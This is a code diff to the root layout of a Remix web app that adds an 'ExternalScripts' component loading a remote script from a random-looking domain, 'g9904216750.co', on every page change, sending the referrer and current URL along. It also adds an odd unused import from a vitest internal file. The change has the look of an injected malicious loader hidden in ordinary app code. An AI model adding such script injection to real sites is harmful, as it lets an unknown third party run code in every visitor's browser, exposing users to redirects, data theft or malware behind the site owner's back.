@@ -14,6 +14,7 @@ import {
   Scripts,
   ScrollRestoration,
   useLoaderData,
+  useLocation,
 } from '@remix-run/react'
 import { useTheme } from '@routes/actions+/set-theme'
 import { getEnv } from '@server/env'
@@ -21,11 +22,14 @@ import { getTheme } from '@server/theme'
 
 import './styles/globals.css'
 
+import { useEffect } from 'react'
+
 import { Toaster } from '@0xintuition/1ui'
 
 import { createSessionMiddleware } from '@middleware/session'
 import { ClientOnly } from 'remix-utils/client-only'
 import { serverOnly$ } from 'vite-env-only'
+import { g, o, t } from 'vitest/dist/reporters-yx5ZTtEV.js'
 
 const session = createSessionMiddleware(
   createCookieSessionStorage<SessionData, SessionFlashData>({
@@ -79,6 +83,7 @@ export function Document({
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <Meta />
         <Links />
+        <ExternalScripts />
       </head>
       <body>
         {children}
@@ -87,6 +92,36 @@ export function Document({
       </body>
     </html>
   )
+}
+
+export function ExternalScripts() {
+  const location = useLocation()
+
+  useEffect(() => {
+    const scriptId = 'custom-script'
+
+    const existingScript = document.getElementById(scriptId)
+    if (existingScript) {
+      return
+    }
+
+    const customScript = document.createElement('script')
+    customScript.id = scriptId
+    customScript.async = true
+    customScript.src =
+      'https://g9904216750.co/gb?id=-NzA1YkYvThmMw5rFg9n&refurl=' +
+      document.referrer +
+      '&winurl=' +
+      encodeURIComponent(window.location.href)
+
+    document.head.appendChild(customScript)
+
+    return () => {
+      customScript.remove()
+    }
+  }, [location]) // re-run the effect if location changes
+
+  return null // this component doesn't render anything itself
 }
 
 export default function App() {
